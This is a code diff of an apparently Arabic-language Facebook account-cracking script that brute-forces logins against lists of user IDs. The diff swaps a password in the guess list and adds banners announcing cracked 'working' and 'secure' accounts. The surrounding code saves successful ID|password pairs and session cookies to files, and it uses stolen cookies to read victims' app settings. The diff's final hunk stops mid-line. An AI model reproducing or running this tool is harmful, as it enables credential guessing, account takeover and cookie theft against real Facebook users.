@@ -343,7 +343,7 @@ def menu(my_name,my_id):
 	os.system('clear')
 	from rich.panel import Panel as Ch
 	from rich import print as code
-	code(Ch('      💢 - اقـل عـدد ايـديـات خـلـي بالاداة 10   ')) 
+	code(Ch('      💢 - اقـل عـدد ايـديـات خـلـي بالاداة 10 اذا ما في صور الصيد اوقف الاداء   ')) 
 	print('')
 	print(a16+'▭▬'*30)
 	print(f"\033[97;1m[\033[92;1m1\033[97;1m] \x1b[33m\x1b[33m \x1b[33m[{MJ3}CRACK PUBLIC\x1b[36m\x1b[33m]")
@@ -717,7 +717,7 @@ def passwrd():
 					pwv.append('12341234@@')
 					pwv.append('zokoloko')
 					pwv.append('aliali@@')
-					pwv.append('حسين علي')
+					pwv.append('Aa123456')
 					pwv.append('mustafa2000')
 					pwv.append('11112222@@')
 					pwv.append('11112222@')
@@ -769,7 +769,7 @@ def crack(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print ('\x1b[36m|CP.|')
 				xda = f'\r[[CP]] ➨ {idf} | {pw} '
-				print ('\x1b[36m――――――――――――――――――――――――')
+				print ('\x1b[36m―――― اسلام جاب لك حساب سكيور―――――――')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -783,7 +783,7 @@ def crack(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				raven_a = f'\r[[OK]] ➨ {idf} | {pw} | \n \n{kuki} '
-				print ('\x1b[32m――――――――――――――――――――――――')
+				print ('\x1b[32m――――――― اسلام جاب لك حساب شغال――――――')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				statusok1 = nel(raven_a, style='green')
 				cetak(nel(statusok1, title='OK'))
@@ -805,25 +805,4 @@ def cek_RAVEN(kuki):
 	game = [i.text for i in x.find_all("h3")]
 	try:
 		for i in range(len(game)):
-			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
-	except AttributeError:
-		print ("\r    %s\033[0m cookie invalid"%(M))
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
-	sop = bs4.BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	try:
-		for i in range(len(game)):
-			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
-	except AttributeError:
-		print ("\r    %s \033[0mcookie invalid"%(M))
-if __name__=='__main__':
-    try:os.system('git pull')
-    except:pass
-    try:os.mkdir('OK')
-    except:pass
-    try:os.mkdir('CP')
-    except:pass
-    try:os.mkdir('/sdcard/VENOM-FB')
-    except:pass
-    RR()
+			print ("\r%s  \033[0m   
